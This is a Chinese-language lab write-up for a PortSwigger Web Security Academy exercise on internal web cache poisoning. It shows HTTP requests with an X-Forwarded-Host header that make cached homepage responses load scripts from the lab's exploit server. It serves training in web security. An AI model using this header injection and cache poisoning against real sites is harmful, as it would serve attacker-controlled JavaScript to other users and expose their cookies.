# 实验室：内部缓存投毒

本实验室存在 Web 缓存投毒漏洞，它使用了多层缓存。一名用户定期使用 Chrome 访问该网站首页。

要解决本实验室，请投毒内部缓存，使首页在受害者浏览器中执行 `alert(document.cookie)`。

[访问实验室](https://portswigger.net/academy/labs/launch/ef5f16230d33fe616215fe47487299d39980a2a94f3d006b7fc3abe6b08837c1)

测试过程中的兴趣点
- 原本 Host 覆盖头部仅可注入3个 URL 中的2个，之后发现剩下的1个也被注入
    ```http
    GET / HTTP/2
    Host: 0ada007d0370d3018006352000ed00b7.web-security-academy.net
    X-Forwarded-Host: exploit-0a79005103aed3d5804c343801f60076.exploit-server.net:444
    ```

    - 响应
        ```html
        <link rel="canonical" href='//exploit-0a79005103aed3d5804c343801f60076.exploit-server.net:444/'/>

        <script type="text/javascript" src="//exploit-0a79005103aed3d5804c343801f60076.exploit-server.net:444/resources/js/analytics.js">
        </script>
        <script src=//exploit-0a79005103aed3d5804c343801f60076.exploit-server.net:777/js/geolocate.js?callback=loadCountry>
        </script>
        ```
    
    - 此处先发送端口 `:777`，再发送 `:444`，回调端点存在缓存行为

- 普通请求发现仅回调端点被之前的请求污染
    ```http
    GET / HTTP/2
    Host: 0ada007d0370d3018006352000ed00b7.web-security-academy.net
    ```

    - 响应

        ```html
        <script src=//exploit-0a79005103aed3d5804c343801f60076.exploit-server.net/js/geolocate.js?callback=loadCountry></script>
        ```
    
    - 一段时间后，再次测试，回调端点复原

- 查看攻击者端点 log，存在受害者连接
- 回调端点被应用程序内部缓存

    `/js/geolocate.js`
